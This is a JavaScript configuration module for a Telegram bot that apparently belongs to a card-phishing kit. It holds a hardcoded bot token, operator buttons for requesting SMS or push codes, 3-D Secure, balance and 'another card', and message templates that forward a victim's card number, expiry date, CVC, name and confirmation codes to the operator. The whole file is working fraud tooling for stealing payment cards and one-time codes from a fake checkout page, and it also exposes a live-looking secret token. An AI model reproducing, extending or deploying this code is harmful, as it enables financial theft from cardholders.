module.exports.api = '7917225525:AAEUQikR19rMawejJUlS2-ENeXl8tU409nk';

module.exports.inlineButtons = {
    reply_markup: {
        inline_keyboard: [

        [{text: 'SMS', callback_data: 'sms'}, {text: 'PUSH', callback_data: 'pushSMS'}],
        [{text: 'CUSTOM SMS', callback_data: 'custom_sms'}, {text: 'CUSTOM PUSH', callback_data: 'custom_pushSMS'}],
        [{text: 'V успешная оплата', callback_data: 'success_pay'}],
        [{text: 'Другая карта', callback_data: 'other_card'}, {text: '3ds:on', callback_data: '3dson'}, {text: 'Online', callback_data: 'online'}],
        [{text: 'СВОЯ ОШИБКА', callback_data: 'own_error'}],
        [{text: 'BALANCE', callback_data: 'balance'}, {text: 'LIMIT', callback_data: 'limit'}]

        ]
    }
};

module.exports.msgBot = (msgData)=> {
    return `Пользователь ввёл данные карты для оплаты
заказа

Номер:${msgData.cardNumber}
Срок: ${msgData.expiryDate}
CSV: ${msgData.cvc}
Имя: ${msgData.billingName}
`
}

module.exports.codeMSG = (clientData, smsData)=> {
    return `[${clientData.customsms ? 'CUSTOM SMS' : 'SMS'}] - Код подтверждения ${smsData}
для пользователя ${clientData.billingName}`
}


